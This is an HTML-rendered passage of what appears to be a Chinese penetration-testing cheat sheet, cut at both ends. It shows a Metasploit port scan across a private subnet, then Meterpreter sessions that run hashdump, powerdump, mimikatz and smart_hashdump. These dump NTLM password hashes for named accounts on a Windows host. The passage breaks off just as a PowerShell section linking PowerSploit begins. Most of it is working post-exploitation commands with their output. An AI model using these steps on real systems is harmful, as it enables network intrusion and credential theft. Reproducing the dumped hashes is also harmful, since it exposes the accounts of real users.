</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msf &gt; use auxiliary/scanner/portscan/tcp 
</span></span><span style=display:flex><span>msf auxiliary(tcp) &gt; show options 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options (auxiliary/scanner/portscan/tcp):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name         Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----         ---------------  --------  -----------
</span></span><span style=display:flex><span>   CONCURRENCY  10               yes       The number of concurrent ports to check per host
</span></span><span style=display:flex><span>   DELAY        0                yes       The delay between connections, per thread, in milliseconds
</span></span><span style=display:flex><span>   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
</span></span><span style=display:flex><span>   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
</span></span><span style=display:flex><span>   RHOSTS                        yes       The target address range or CIDR identifier
</span></span><span style=display:flex><span>   THREADS      1                yes       The number of concurrent threads
</span></span><span style=display:flex><span>   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf auxiliary(tcp) &gt; set PORTS 22-25,80-85,1433,3306,3389,445,135,139
</span></span><span style=display:flex><span>PORTS =&gt; 22-25,80-85,1433,3306,3389,445,135,139
</span></span><span style=display:flex><span>msf auxiliary(tcp) &gt; set RHOSTS 10.159.191.1-254
</span></span><span style=display:flex><span>RHOSTS =&gt; 10.159.191.1-254
</span></span><span style=display:flex><span>msf auxiliary(tcp) &gt; set THREADS 3
</span></span><span style=display:flex><span>THREADS =&gt; 3
</span></span><span style=display:flex><span>msf auxiliary(tcp) &gt; run
</span></span><span style=display:flex><span>[+] 10.159.191.1:         - 10.159.191.1:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.2:         - 10.159.191.2:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.5:         - 10.159.191.5:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.5:         - 10.159.191.5:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.7:         - 10.159.191.7:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.8:         - 10.159.191.8:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.7:         - 10.159.191.7:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.8:         - 10.159.191.8:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.6:         - 10.159.191.6:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.10:        - 10.159.191.10:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.11:        - 10.159.191.11:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.9:         - 10.159.191.9:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.11:        - 10.159.191.11:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.9:         - 10.159.191.9:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.10:        - 10.159.191.10:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.12:        - 10.159.191.12:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.12:        - 10.159.191.12:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.15:        - 10.159.191.15:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.15:        - 10.159.191.15:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.13:        - 10.159.191.13:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.18:        - 10.159.191.18:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.17:        - 10.159.191.17:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.19:        - 10.159.191.19:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.19:        - 10.159.191.19:8080 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.26:        - 10.159.191.26:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.26:        - 10.159.191.26:3306 - TCP OPEN
</span></span><span style=display:flex><span>[*] Scanned  26 of 254 hosts (10% complete)
</span></span><span style=display:flex><span>[+] 10.159.191.35:        - 10.159.191.35:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.36:        - 10.159.191.36:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.39:        - 10.159.191.39:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.39:        - 10.159.191.39:3306 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.50:        - 10.159.191.50:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.51:        - 10.159.191.51:22 - TCP OPEN
</span></span><span style=display:flex><span>[+] 10.159.191.50:        - 10.159.191.50:3306 - TCP OPEN
</span></span><span style=display:flex><span>******
</span></span></code></pre></td></tr></table></div></div><h2 id=0x05-meterpreter>0x05 Meterpreter</h2><h3 id=获取hash的几个方式>获取Hash的几个方式</h3><blockquote><p>run hashdump</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> run hashdump 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>!</span>] Meterpreter scripts are deprecated<span style=color:#f92672>.</span> Try post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>gather<span style=color:#f92672>/</span>smart_hashdump<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>!</span>] Example: run post<span style=color:#f92672>/</span>windows<span style=color:#f92672>/</span>gather<span style=color:#f92672>/</span>smart_hashdump OPTION<span style=color:#f92672>=</span>value [<span style=color:#f92672>...</span>]
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Obtaining the boot key<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Calculating the hboot key using SYSKEY <span style=color:#ae81ff>699</span>b2df6ee97132bcad5b2f9efdc738e<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>opt<span style=color:#f92672>/</span>metasploit<span style=color:#f92672>-</span>framework<span style=color:#f92672>/</span>embedded<span style=color:#f92672>/</span>framework<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>rex<span style=color:#f92672>/</span>script<span style=color:#f92672>/</span>base<span style=color:#f92672>.</span>rb:<span style=color:#ae81ff>134</span>: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Obtaining the user list <span style=color:#f92672>and</span> keys<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Decrypting user keys<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>opt<span style=color:#f92672>/</span>metasploit<span style=color:#f92672>-</span>framework<span style=color:#f92672>/</span>embedded<span style=color:#f92672>/</span>framework<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>rex<span style=color:#f92672>/</span>script<span style=color:#f92672>/</span>base<span style=color:#f92672>.</span>rb:<span style=color:#ae81ff>268</span>: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>opt<span style=color:#f92672>/</span>metasploit<span style=color:#f92672>-</span>framework<span style=color:#f92672>/</span>embedded<span style=color:#f92672>/</span>framework<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>rex<span style=color:#f92672>/</span>script<span style=color:#f92672>/</span>base<span style=color:#f92672>.</span>rb:<span style=color:#ae81ff>272</span>: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>opt<span style=color:#f92672>/</span>metasploit<span style=color:#f92672>-</span>framework<span style=color:#f92672>/</span>embedded<span style=color:#f92672>/</span>framework<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>rex<span style=color:#f92672>/</span>script<span style=color:#f92672>/</span>base<span style=color:#f92672>.</span>rb:<span style=color:#ae81ff>279</span>: warning: constant OpenSSL::Cipher::Cipher is deprecated
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Dumping password hints<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>No users with password hints on this system
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Dumping password hashes<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Administrator:<span style=color:#ae81ff>500</span>:aad3b4<span style=color:#f92672>***</span>b51404ee:a4b09576473b6a35e456ed407a98e334:::
</span></span><span style=display:flex><span>Guest:<span style=color:#ae81ff>501</span>:aad3b435b5140<span style=color:#f92672>***</span><span style=color:#ae81ff>404</span>ee:<span style=color:#ae81ff>31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>ftpuser:<span style=color:#ae81ff>1000</span>:aad3b435b51<span style=color:#f92672>****</span>ee:<span style=color:#ae81ff>2280</span>c4ddb554cdcdc62c72c291f2810a:::
</span></span><span style=display:flex><span>patrol:<span style=color:#ae81ff>1002</span>:aad3b435b51<span style=color:#f92672>****</span><span style=color:#ae81ff>78</span>ab2d769fda7de045a3622a62ea:::
</span></span><span style=display:flex><span>neuadmin:<span style=color:#ae81ff>1005</span>:aad3b435<span style=color:#f92672>***</span><span style=color:#ae81ff>404</span>ee:<span style=color:#ae81ff>345</span>b3b0faf52aea5200da1cf8d1323a0:::
</span></span></code></pre></td></tr></table></div></div><blockquote><p>run powerdump</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> run powerdump 
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] PowerDump v0<span style=color:#f92672>.</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span> PowerDump to extract Username <span style=color:#f92672>and</span> Password Hashes<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Running PowerDump to extract Username <span style=color:#f92672>and</span> Password Hashes<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Uploaded PowerDump as <span style=color:#ae81ff>53805.</span>ps1 to <span style=color:#f92672>%</span>TEMP<span style=color:#f92672>%...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Setting ExecutionPolicy to Unrestricted<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Dumping the SAM database through PowerShell<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>??</span>Administrator:<span style=color:#ae81ff>500</span>:aad3b435b51404eeaad3b435b51404ee:a4b09576473b6a35e456ed407a98e334:::
</span></span><span style=display:flex><span>Guest:<span style=color:#ae81ff>501</span>:aad3b435b51404eeaad3b435b51404ee:<span style=color:#ae81ff>31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>ftpuser:<span style=color:#ae81ff>1000</span>:aad3b435b51404eeaad3b435b51404ee:<span style=color:#ae81ff>2280</span>c4ddb554cdcdc62c72c291f2810a:::
</span></span><span style=display:flex><span>patrol:<span style=color:#ae81ff>1002</span>:aad3b435b51404eeaad3b435b51404ee:ce7878ab2d769fda7de045a3622a62ea:::
</span></span><span style=display:flex><span>neuadmin:<span style=color:#ae81ff>1005</span>:aad3b435b51404eeaad3b435b51404ee:<span style=color:#ae81ff>345</span>b3b0faf52aea5200da1cf8d1323a0:::
</span></span><span style=display:flex><span>allen:<span style=color:#ae81ff>1007</span>:aad3b435b51404eeaad3b435b51404ee:<span style=color:#ae81ff>53</span>a6281e41664275dfbccd4d171e406f:::
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Setting Execution policy back to Restricted<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Cleaning up after ourselves<span style=color:#f92672>...</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>load mimikatz
kerberos</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> load mimikatz 
</span></span><span style=display:flex><span>Loading extension mimikatz<span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>!</span>] Loaded x86 Mimikatz on an x64 architecture<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Success<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>meterpreter <span style=color:#f92672>&gt;</span> kerberos 
</span></span><span style=display:flex><span>[<span style=color:#f92672>+</span>] Running as SYSTEM
</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Retrieving kerberos credentials
</span></span><span style=display:flex><span>kerberos credentials
</span></span><span style=display:flex><span><span style=color:#f92672>====================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>AuthID      Package    Domain        User           Password
</span></span><span style=display:flex><span><span style=color:#f92672>------</span>      <span style=color:#f92672>-------</span>    <span style=color:#f92672>------</span>        <span style=color:#f92672>----</span>           <span style=color:#f92672>--------</span>
</span></span><span style=display:flex><span><span style=color:#f92672>******</span>      <span style=color:#f92672>*******</span>    <span style=color:#f92672>******</span>        <span style=color:#f92672>****</span>           <span style=color:#f92672>********</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>run post/windows/gather/smart_hashdump</p></blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>meterpreter &gt; run post/windows/gather/smart_hashdump
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[*] Running module against ZXKF3
</span></span><span style=display:flex><span>[*] Hashes will be saved to the database if one is connected.
</span></span><span style=display:flex><span>[+] Hashes will be saved in loot in JtR password file format to:
</span></span><span style=display:flex><span>[*] /Users/liyingzhe/.msf4/loot/20171228143129_default_10.159.191.178_windows.hashes_440460.txt
</span></span><span style=display:flex><span>[*] Dumping password hashes...
</span></span><span style=display:flex><span>[*] Running as SYSTEM extracting hashes from registry
</span></span><span style=display:flex><span>[*] 	Obtaining the boot key...
</span></span><span style=display:flex><span>[*] 	Calculating the hboot key using SYSKEY 699b2df6ee97132bcad5b2f9efdc738e...
</span></span><span style=display:flex><span>[*] 	Obtaining the user list and keys...
</span></span><span style=display:flex><span>[*] 	Decrypting user keys...
</span></span><span style=display:flex><span>[*] 	Dumping password hints...
</span></span><span style=display:flex><span>[*] 	No users with password hints on this system
</span></span><span style=display:flex><span>[*] 	Dumping password hashes...
</span></span><span style=display:flex><span>[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4b09576473b6a35e456ed407a98e334:::
</span></span><span style=display:flex><span>[+] 	ftpuser:1000:aad3b435b51404eeaad3b435b51404ee:2280c4ddb554cdcdc62c72c291f2810a:::
</span></span><span style=display:flex><span>[+] 	patrol:1002:aad3b435b51404eeaad3b435b51404ee:ce7878ab2d769fda7de045a3622a62ea:::
</span></span><span style=display:flex><span>[+] 	neuadmin:1005:aad3b435b51404eeaad3b435b51404ee:345b3b0faf52aea5200da1cf8d1323a0:::
</span></span></code></pre></td></tr></table></div></div><h2 id=0x06-powershell技巧>0x06 PowerShell技巧</h2><h3 id=外部powershell脚本>外部Powershell脚本</h3><blockquote><p>Powersploit <a href=https://github.com/PowerShellMafia/PowerSploit>https://github.com/PowerShellMafia/PowerSploit</a></p></blockquote><p>第一种办法（推荐）：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
